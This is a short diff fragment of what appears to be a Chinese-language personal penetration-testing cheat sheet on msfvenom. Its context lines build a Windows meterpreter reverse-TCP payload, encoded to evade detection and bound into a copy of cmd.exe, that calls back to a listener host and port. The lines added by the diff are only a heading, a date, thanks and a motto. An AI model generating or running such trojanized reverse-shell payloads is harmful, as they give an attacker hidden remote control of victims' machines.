@@ -47,4 +47,12 @@ msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00
 捆绑进cmd.exe，目前失败，程序无法执行
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=10.2.7.130 lport=11206 -b '\x00' -x cmd.exe -k -i 12 -f exe -o cmd1.exe
 ```
+#### use + 载荷 ，快速载入脚本
+```angular2html
+2021-05-14编写
+感谢lyh
 
+```
+
+
+> 乾坤未定，你我皆是黑马
